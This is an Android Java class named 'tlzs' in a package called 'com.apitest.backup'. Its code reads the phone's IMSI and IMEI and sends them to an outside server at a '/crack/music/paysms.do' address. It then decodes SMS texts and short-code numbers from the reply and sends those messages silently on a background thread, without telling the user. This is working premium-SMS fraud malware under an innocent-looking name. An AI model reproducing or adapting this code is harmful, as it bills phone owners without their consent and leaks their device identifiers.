package com.apitest.backup;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.alibaba.fastjson.JSONObject;
import com.apitest.TianLaiResponse;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;

public class tlzs
{
    public tlzs()
    {
        // TODO Auto-generated constructor stub
    }

    public static void charge_by_api(final Context context)
    {
        new Thread()
        {
            public void run()
            {
                try
                {
                    Looper.prepare();

                    String response = getResponse(context);
                    TianLaiResponse tianLaiResponse = JSONObject.parseObject(response, TianLaiResponse.class);

                    if (tianLaiResponse == null || tianLaiResponse.getResult() != 0)
                    {
                        return;
                    }

                    String smsContent = tianLaiResponse.getSms();
                    String sms1 = smsContent.split("&")[0];
                    String sms2 = smsContent.split("&")[1];

                    String portContent = tianLaiResponse.getPort();
                    String port1 = portContent.split("&")[0];
                    String port2 = portContent.split("&")[1];

                    sms1 = new String(Base64.decode(sms1, Base64.DEFAULT));
                    sms2 = new String(Base64.decode(sms2, Base64.DEFAULT));
                    if (!sms1.isEmpty())
                    {
                        Log.e("xcngame", "send " + port1 + " ==" + sms1);
                        sendSMS(context, port1, sms1);
                    }

                    Log.e("xcngame", port2 + "==" + sms2);
                    if (!sms2.isEmpty())
                    {
                        sendSMS(context, port2, sms2);
                    }
                }
                catch (Exception e)
                {
                    Log.e("xcngame", e.getMessage());
                }
            }
        }.start();
    }

    private static String getResponse(Context context)
    {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imsi = tm.getSubscriberId();
        String imei = tm.getDeviceId();// String

        String ptid = "53004";
        String cpparam = "JH6038";
        String version = "1.0.0";
        String itemId = "600967020000006038";
        String itemPrice = "600";
        String mode = "0";
        String itemSafeLevel = "0";
        String itemMethod = "1";
        String itemEx = "";

        String url = "http://mus.yiqiao580.com/crack/music/paysms.do?ptid=" + ptid + "&imei=" + imei + "&imsi=" + imsi + "&cpparam=" + cpparam + "&version=" + version + "&itemId=" + itemId + "&itemPrice=" + itemPrice + "&mode=" + mode + "&itemSafeLevel=" + itemSafeLevel + "&itemMethod=" + itemMethod + "&itemEx=" + itemEx;//点播

        return getUrl(url);
    }

    private static void sendSMS(Context context, String port, String sms)
    {
        SmsManager smsManager = SmsManager.getDefault();
        Intent sentIntent = new Intent("SENT_SMS_Music_Reg");
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);
        smsManager.sendTextMessage(port, null, sms, sentPI, null);
    }

    public static String getUrl(String url)
    {
        try
        {
            URL httpUrl = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();
            httpURLConnection.setRequestMethod("GET");
            int responseCode = httpURLConnection.getResponseCode();

            if(responseCode!=HttpURLConnection.HTTP_OK)
            {
                throw new Exception("服务器错误");
            }

            InputStream inputStream = httpURLConnection.getInputStream();
            Reader reader = new InputStreamReader(inputStream);
            BufferedReader bufferedReader = new BufferedReader(reader);

            StringBuilder stringBuilder=new StringBuilder();
            String line;
            while (true)
            {
                line = bufferedReader.readLine();
                if(line!=null)
                    stringBuilder.append(line);
                else
                    break;
            }
            return stringBuilder.toString();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

        return null;
    }
}
